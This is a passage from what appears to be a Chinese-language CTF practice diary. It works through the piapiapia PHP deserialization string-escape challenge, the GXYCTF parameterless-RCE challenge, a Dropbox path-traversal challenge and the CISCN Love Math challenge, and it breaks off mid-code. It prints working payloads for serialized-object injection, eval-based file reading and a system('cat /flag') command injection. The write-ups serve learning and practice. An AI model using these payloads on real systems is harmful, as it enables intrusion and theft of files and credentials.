class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'root'</span><span class="token punctuation">;</span>    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里思路有了：利用profile.php中存在的文件读取函数（file_get_contents）来实现config.php的打印，而这里只是将profile[‘phpoto’]来进行输出，而$profile会被作为数组来先反序列化，然后再进行下面的赋值操作，所以就需要我们将要读的文件放在数组$profile中的photo的位置，当这段代码:$photo = base64_encode(file_get_contents($profile[‘photo’]));被执行后，在前端就会出现我们需要的信息了，但是如何传入序列化的值而不被过滤？？？？？</p><p>首先要知道profile是作为数组来进行反序列化的，而这里就存在一个叫做<a href="https://www.cnblogs.com/litlife/p/11690918.html#0x02-0ctf-2016-piapiapia" target="_blank" rel="noopener">PHP序列化长度变化导致尾部字符逃逸</a>，也就是在数组中，利用闭合的中括号的特点来实现自定义结束反序列化操作，同时将序列化后面的字符挤入到数组的下一个参数当中，所以我们可以先看一下现在的profile中数组经过反序列化后的样子：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'17616150330'</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'yyk@qq.com'</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string">'photo'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'upload/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//文件上传，文件读取的利用点</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到：</p><p><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;17616150330&quot;;s:5:&quot;email&quot;;s:10:&quot;yyk@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:5:&quot;yn8rt&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;}</code></p><p>同时解决字符受限制函数strlen()的影响：利用数组进行绕过</p><p>然后接下来的操作就是利用溢出来的字符实现数组中的photo的值为用户可控: </p><p><code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>一共34个字符，所以我就需要额外的34的字符来替代这后面的自定义序列化字符，首先不论你输入多少字符串都没法让反序列化报错，因为s的值是先判断的，此时我们可以让其先判断后改变，也就是利用filter函数，利用where变成hacker多了一个字符，使反序列化的过程中报错，让他多出34个字符来替代我们的攻击payload，让我们的攻击payload成功伪造，将真正的photo的值给成功替代：</p><pre class="line-numbers language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"17616150330"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"yyk@qq.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"nickname"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">204</span><span class="token punctuation">:</span><span class="token string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";}s:5:"</span>photo<span class="token string">";s:39:"</span>upload<span class="token operator">/</span>d41d8cd98f00b204e9800998ecf8427e"<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"17616150330"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"yyk@qq.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"nickname"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">238</span><span class="token punctuation">:</span><span class="token string">"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";}s:5:"</span>photo<span class="token string">";s:39:"</span>upload<span class="token operator">/</span>d41d8cd98f00b204e9800998ecf8427e"<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样后面在数组中的photo的位置就被替换为我们想要的值了，然后读取config文件中的flag就可以了</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token number">9</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'hostname'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'root'</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'qwertyuiop'</span><span class="token punctuation">;</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'challenges'</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'flag{b1f24b3e-d20d-4f65-806a-06c29b1969ca}'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2021-06-01"><a href="#2021-06-01" class="headerlink" title="2021-06-01"></a>2021-06-01</h1><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>做这个题的时候是不知道禁止套娃是什么意思的，等完全理解<a href="https://zhidao.baidu.com/question/1696866624128831108.html" target="_blank" rel="noopener"><code>((?R)?\)\)</code></a>了这个正则匹配表达式以后就可以明白，所谓的套娃就是什么 </p><h3 id="考点：-1"><a href="#考点：-1" class="headerlink" title="考点："></a>考点：</h3><p>无参数rce</p><p>信息泄露</p><p>利用dirsearch开延时，会扫出来.git相关的泄露，利用githack将源码down下来</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// echo $_GET['exp'];</span>                @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// highlight_file(__FILE__);</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码审计分析："><a href="#代码审计分析：" class="headerlink" title="代码审计分析："></a>代码审计分析：</h3><p>第一个判断：匹配了所有的文件读取</p><p>第二个判断：此处匹配为递归替换，将所有的格式为函数空参数的替换为null，然后判断最后是否为分号</p><p>第三个判断：匹配了部分关键函数的关键词</p><p>以上三个条件都满足的话，会是执行eval函数了</p><h3 id="扫盲："><a href="#扫盲：" class="headerlink" title="扫盲："></a>扫盲：</h3><p><a href="https://www.runoob.com/php/func-array-current.html" target="_blank" rel="noopener">PHP current() 函数</a>：返回数组中的当前元素的值，不过该函数不会移动数组内部指针与pos()函数用法一致。</p><p><a href="https://www.runoob.com/php/func-string-localeconv.html" target="_blank" rel="noopener">PHP localeconv() 函数</a>：返回一个包含本地数字及货币格式信息的数组。在此题中利用的是他的第一个value=’.’，利用current()函数与其结合就能实现返回值为一个点</p><p><a href="https://www.runoob.com/php/func-directory-scandir.html" target="_blank" rel="noopener">PHP scandir() 函数</a>：累出目录中的文件和目录，就想是在linux系统下的ls -al</p><p><a href="https://www.runoob.com/php/php-print_r-function.html" target="_blank" rel="noopener">PHP print_r() 函数</a>：用于打印变量，以更容易理解的形式展示。</p><p>利用以上这三个函数就可以实现打印出目录中的文件或目录：</p><p><code>?exp=print_r(scandir(current(localeconv())));</code></p><h3 id="姿势展示-可以利用以下payload来本地试验-："><a href="#姿势展示-可以利用以下payload来本地试验-：" class="headerlink" title="姿势展示(可以利用以下payload来本地试验)："></a>姿势展示(可以利用以下payload来本地试验)：</h3><h4 id="姿势一："><a href="#姿势一：" class="headerlink" title="姿势一："></a>姿势一：</h4><p><a href="https://www.runoob.com/php/func-array-rand.html" target="_blank" rel="noopener">PHP array_rand() 函数</a>：返回一个包含随机键名的数组</p><p><a href="https://www.runoob.com/php/func-array-flip.html" target="_blank" rel="noopener">PHP array_flip() 函数</a>：反转数组中的键名和对应关联的键值</p><p>此处如果没有flip函数的话，返回值只能是健值</p><p><code>?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code></p><h4 id="姿势二："><a href="#姿势二：" class="headerlink" title="姿势二："></a>姿势二：</h4><p><a href="https://www.runoob.com/php/func-array-reverse.html" target="_blank" rel="noopener">PHP array_reverse() 函数</a>：以相反的顺序返回数组</p><p><a href="https://www.runoob.com/php/func-array-next.html" target="_blank" rel="noopener">PHP next() 函数</a>：将数组中的内部指着指向下一个元素并输出与current()函数结合使用</p><p><a href="https://www.runoob.com/php/func-filesystem-readfile.html" target="_blank" rel="noopener">PHP readfile() 函数</a>：函数读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。</p><p><code>?exp=readfile(next(array_reverse(scandir(current(localeconv())))));</code></p><h4 id="姿势三："><a href="#姿势三：" class="headerlink" title="姿势三："></a>姿势三：</h4><p>利用会话中的内容来实现定位读取(这里前提是已经知道了文件名)</p><p>session_id():可以获取到当前的会话ID.</p><p>session_start():会创建新会话或者重用现有会话。如果通过 GET 或者 POST 方式,或者使用 cookie 提交了会话 ID， 则会重用现有会话。</p><p>因为SessionID是存放在客户端的cookie中的,所以我们必须手动设置会话ID为flag.php来读取到其中的内容，会话id需要为=PHPSESSID</p><p><code>?exp=readfile(session_id(session_start()));</code></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8802%E6%97%A51416_2.png" alt></p><h3 id="技术支持："><a href="#技术支持：" class="headerlink" title="技术支持："></a>技术支持：</h3><p><a href="https://www.cnblogs.com/wangtanzhi/p/12311239.html" target="_blank" rel="noopener">王叹之</a></p><h1 id="2021-06-02"><a href="#2021-06-02" class="headerlink" title="2021-06-02"></a>2021-06-02</h1><h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>题目为网盘主题的cms</p><h3 id="信息收集阶段："><a href="#信息收集阶段：" class="headerlink" title="信息收集阶段："></a>信息收集阶段：</h3><p>网站含有上传、下载、登陆、注册、删除功能</p><p>同时在下载处存在目录穿越    下载漏洞：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B406%E6%9C%8802%E6%97%A51640_1.png" alt></p><p>可以根据down下来的一些php文件中的信息，和</p><h1 id="2021-06-03"><a href="#2021-06-03" class="headerlink" title="2021-06-03"></a>2021-06-03</h1><p>CS:GO</p><h1 id="2021-06-04"><a href="#2021-06-04" class="headerlink" title="2021-06-04"></a>2021-06-04</h1><p>CS:GO</p><h1 id="2021-06-05"><a href="#2021-06-05" class="headerlink" title="2021-06-05"></a>2021-06-05</h1><p>上午+下午CS:GO</p><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><h3 id="扫盲：-1"><a href="#扫盲：-1" class="headerlink" title="扫盲："></a>扫盲：</h3><p>1.<a href="https://www.runoob.com/php/php-preg_match_all.html" target="_blank" rel="noopener">preg_match_all()函数</a>：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token string">"Name: &lt;b>PHP&lt;/b> &lt;br> Title: &lt;b>Programming Language&lt;/b>"</span><span class="token punctuation">;</span><span class="token function">preg_match_all</span> <span class="token punctuation">(</span><span class="token string">"/&lt;b>(.*)&lt;\/b>/U"</span><span class="token punctuation">,</span> <span class="token variable">$userinfo</span><span class="token punctuation">,</span> <span class="token variable">$pat_array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$pat_array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以第二个参数为匹配对象，第一个参数为正则表达式，然后将结果以数组的形式储存在第三个参数当中</p><p>2.<code>/m</code>在正则表达式中的作用为：将模式视为多行，使用^和$表示任何一行都可以以正则表达式开始或结束</p><p>3.<a href="https://www.runoob.com/php/func-array-in-array.html" target="_blank" rel="noopener">in_array()</a>：判断数组中是否存在指定的值</p><p>4.<a href="https://www.runoob.com/php/func-math-base-convert.html" target="_blank" rel="noopener">PHP base_convert() 函数</a>：函数在任意进制之间转换数字：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">/</span>把八进制数转换为十六进制数：<span class="token delimiter">&lt;?php</span><span class="token variable">$oct</span> <span class="token operator">=</span> <span class="token string">"364"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token variable">$oct</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5.</p><p>题目：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//例子 c=20-1</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"太长了不会算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"请不要输入奇奇怪怪的字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'acos'</span><span class="token punctuation">,</span> <span class="token string">'acosh'</span><span class="token punctuation">,</span> <span class="token string">'asin'</span><span class="token punctuation">,</span> <span class="token string">'asinh'</span><span class="token punctuation">,</span> <span class="token string">'atan2'</span><span class="token punctuation">,</span> <span class="token string">'atan'</span><span class="token punctuation">,</span> <span class="token string">'atanh'</span><span class="token punctuation">,</span> <span class="token string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string">'bindec'</span><span class="token punctuation">,</span> <span class="token string">'ceil'</span><span class="token punctuation">,</span> <span class="token string">'cos'</span><span class="token punctuation">,</span> <span class="token string">'cosh'</span><span class="token punctuation">,</span> <span class="token string">'decbin'</span><span class="token punctuation">,</span> <span class="token string">'dechex'</span><span class="token punctuation">,</span> <span class="token string">'decoct'</span><span class="token punctuation">,</span> <span class="token string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'expm1'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'fmod'</span><span class="token punctuation">,</span> <span class="token string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string">'hypot'</span><span class="token punctuation">,</span> <span class="token string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string">'log10'</span><span class="token punctuation">,</span> <span class="token string">'log1p'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> <span class="token string">'min'</span><span class="token punctuation">,</span> <span class="token string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string">'octdec'</span><span class="token punctuation">,</span> <span class="token string">'pi'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string">'rand'</span><span class="token punctuation">,</span> <span class="token string">'round'</span><span class="token punctuation">,</span> <span class="token string">'sin'</span><span class="token punctuation">,</span> <span class="token string">'sinh'</span><span class="token punctuation">,</span> <span class="token string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string">'srand'</span><span class="token punctuation">,</span> <span class="token string">'tan'</span><span class="token punctuation">,</span> <span class="token string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$used_funcs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$used_funcs</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"请不要输入奇奇怪怪的函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//帮你算出答案</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo '</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$blacklist黑名单过滤函数</p><p>$whitelist白名单限制函数</p><p>白名单中提到的几个函数：</p><p>base_convert() 函数：在任意进制之间转换数字。<br>dechex() 函数：把十进制转换为十六进制。<br>hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。</p><p>这三个函数的结合就可以实现任意字符的转换</p><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>我们需要的payload</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>system<span class="token operator">&amp;</span>b<span class="token operator">=</span>cat <span class="token operator">/</span>flag<span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'echo'</span><span class="token punctuation">.</span><span class="token variable">$content</span><span class="token punctuation">.</span><span class="token 